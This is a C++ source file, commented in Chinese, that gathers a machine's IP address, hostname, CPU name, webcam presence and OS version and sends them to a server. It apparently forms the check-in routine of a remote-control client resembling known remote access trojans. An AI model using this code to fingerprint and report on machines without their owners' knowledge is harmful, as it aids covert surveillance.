#include"pch.h"
#include"Login.h"
#pragma warning(disable: 4996)

int SendLoginInformation(CIocpClient* IOCPClient, DWORD WebSpeed)
{
	int Status;
	LOGIN_INFORMAITON LoginInfo = { 0 };

	LoginInfo.IsToken = CLIENT_LOGIN;

	//获得当前客户端IP地址
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(sockaddr_in));
	int ClientAddressLength = sizeof(sockaddr_in);
	getsockname(IOCPClient->m_ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength);

	//存入结构中
	LoginInfo.ClientAddress = ClientAddress.sin_addr;

	//获得当前客户端HostName
	gethostname(LoginInfo.HostName, MAX_PATH);

	//获得当前客户端CPU型号
	ULONG ProcessNameLength = MAX_PATH;
	Status = GetProcessorName(LoginInfo.ProcessorName, &ProcessNameLength);

	//判断当前客户端有无摄像头
	LoginInfo.IsWebCameraExist = IsWebCamera();

	//获得当前客户端系统版本信息
	LoginInfo.OsVersionInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionExA((OSVERSIONINFO*)&LoginInfo.OsVersionInfoEx);

	int ReturnLength = 0;
	ReturnLength = IOCPClient->OnSending((char*)&LoginInfo, sizeof(LOGIN_INFORMAITON));   //发送数据到服务器
	return ReturnLength;
}

LONG GetProcessorName(char* ProcessorName, ULONG* ProcessorNameLength)
{
	HKEY	 KeyHandle;
	LONG Status;

	//通过注册表 5个主键
	//regedit
	DWORD	Type = REG_SZ;
	Status = RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
		&KeyHandle);  //获得注册表键句柄
	if (Status != ERROR_SUCCESS)
	{
		return Status;
	}
	Status = RegQueryValueEx(KeyHandle, "ProcessorNameString",
		NULL, &Type, (LPBYTE)ProcessorName, ProcessorNameLength);
	RegCloseKey(KeyHandle);
	return Status;
}

BOOL IsWebCamera()
{
	BOOL	IsOk = FALSE;
	CHAR	v1[MAX_PATH];
	//请求设备(摄像头 USB 打印机)  -----   
	for (int i = 0; i < 10 && !IsOk; i++)
	{
		IsOk = capGetDriverDescription(i, v1, sizeof(v1), NULL, 0);
	}
	return IsOk;
}

